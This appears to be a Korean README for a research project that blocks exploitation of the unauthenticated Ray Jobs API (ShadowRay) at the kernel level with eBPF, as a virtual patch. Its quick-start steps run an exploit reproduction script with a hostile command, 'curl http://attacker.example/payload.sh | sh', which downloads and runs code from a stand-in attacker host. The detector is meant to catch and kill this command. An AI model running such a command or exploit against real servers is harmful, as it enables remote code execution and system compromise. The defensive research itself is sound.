# kShield-VirtualPatch

eBPF 기반 AI 서빙 프레임워크 취약점 가상 패치(Virtual Patching) 연구

## 개요

AI 서빙 프레임워크(Ray, vLLM, Triton 등)에서 발견되는 원격 코드 실행(RCE) 취약점은 벤더 패치가 지연되거나(예: CVE-2023-48022, "ShadowRay"), 조직 내부적으로 업그레이드가 늦어지는 경우가 많다. 본 프로젝트는 eBPF를 이용해 애플리케이션 코드를 수정하지 않고, 알려진 취약점의 악용 시 발생하는 비정상 시스템 콜 패턴(예: 예상치 못한 `execve()`, 비인가 아웃바운드 연결)을 커널 수준에서 탐지·차단하는 가상 패치 메커니즘을 연구한다.

## 배경

- **취약점 사례**: Ray의 Jobs Submission API는 기본적으로 인증 메커니즘이 없어 원격 코드 실행이 가능하다(CVE-2023-48022). Oligo Security의 조사에 따르면 수천 대의 Ray 클러스터가 실제로 침해되어 암호화폐 채굴, 역방향 셸, 크레덴셜 탈취 등에 악용되었다.
- **기존 방법의 한계**: 벤더가 "의도된 설계"라는 입장을 취하며 공식 패치를 제공하지 않거나, 조직 내부적으로 프레임워크 업그레이드에 따른 프로덕션 호환성 리스크로 패치 적용이 지연된다.
- **제안 방향**: eBPF kprobe를 이용해 정상 워크로드에서는 발생하지 않는 시스템 콜(예: AI 워커 프로세스의 셸 실행, 비인가 외부 연결)을 탐지하여 코드 변경이나 재배포 없이 즉시 차단한다. 실제 패치가 배포되면 eBPF 훅을 제거하면 된다.

## 위협 모델 (초안)

공격자는 AI 서빙 프레임워크의 관리 API(예: Ray Jobs Submission API, 기본 포트 8265)에 네트워크로 접근 가능하며, 인증 부재 취약점을 악용하여 임의 코드를 원격에서 실행시킬 수 있다. 목표는 원격 코드 실행을 통해 비정상적인 하위 프로세스 실행이나 외부 서버로의 아웃바운드 연결을 수립하여 2차 피해(암호화폐 채굴, 데이터 유출, 크레덴셜 탈취)를 유발하는 것이다.

본 연구는 취약점 악용 이후의 악성 행위 탐지에 집중하며, 취약점 자체의 진단이나 초기 침투 벡터 차단, 그리고 다룬 CVE 외의 일반화된 방어는 범위 밖으로 한다.

## 프로젝트 구조

```
kShield-VirtualPatch/
├── paper_draft.md            논문 초안 (1~3장 완성, 4장 실험은 TODO)
├── setup.sh                  VM 의존성 설치 + vmlinux.h 생성 + 빌드
├── src/
│   ├── kshield_vpatch.bpf.c    커널 공간 BPF 프로그램 (SHADOW_EXEC 탐지)
│   ├── kshield_vpatch.c        사용자 공간 로더/로거
│   └── Makefile
└── attack/
    ├── mock_ray_server.py      ShadowRay 취약점 재현용 목업 Jobs API
    ├── exploit_shadowray.py    공격(악성 job) 재현 스크립트
    └── benchmark_vpatch.py     성능 오버헤드 측정 스크립트 (정상 job 반복 제출)
```

## 빠른 시작 (VM에서)

```bash
# 0) 최초 1회: 의존성 설치 + vmlinux.h 생성 + 빌드
bash setup.sh

# 1) 목업 취약 서버 실행
python3 attack/mock_ray_server.py

# 2) (다른 터미널) kShield-VirtualPatch 실행
sudo ./src/kshield_vpatch

# 3) (다른 터미널) 공격 재현 — kShield-VirtualPatch 로그에 SHADOW_EXEC 탐지가 떠야 함
python3 attack/exploit_shadowray.py --cmd "curl http://attacker.example/payload.sh | sh"

# 4) 정상 job도 문제없이 통과하는지 확인 (오탐 여부)
python3 attack/exploit_shadowray.py --cmd "echo benign-job"

# 5) (나중에, 실험 단계) 성능 오버헤드 측정
python3 attack/benchmark_vpatch.py --count 500 --output metrics_vpatch_on.csv
```

## 상태

**PoC 검증 완료, 논문 4장(실험) 진행 전 단계.**

VM 실측(Ubuntu, 실제 curl 사용)으로 다음을 확인하였다.
- 빌드: 컴파일·CO-RE 재배치·attach 모두 에러 없이 성공
- 정상 job(`echo`, `python3 -c ...`) → 오탐 없이 통과
- 악성 job(`curl ... | sh`, python3 → sh → curl 2단계 체인) → curl exec 시점에
  정확히 SIGKILL로 차단됨을 `SHADOW_EXEC 탐지!` 로그로 확인

`paper_draft.md`의 4장(실험) 수치는 아직 `[TODO]`이며, N회 반복 성능 측정만 남아있다.

관련 프로젝트: [kShield (원본, 모델 파일 보안)](https://github.com/sangheon-lee1028/Ai-ebpf)
